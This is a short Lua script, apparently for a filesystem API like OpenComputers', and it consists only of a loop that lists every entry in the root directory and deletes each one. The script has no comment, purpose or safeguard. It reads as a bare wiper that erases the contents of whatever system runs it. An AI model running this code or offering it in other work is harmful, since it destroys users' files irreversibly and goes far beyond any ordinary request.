local filesystem = require("filesystem")

    for file in filesystem.list("/") do
      filesystem.remove(file)
    end
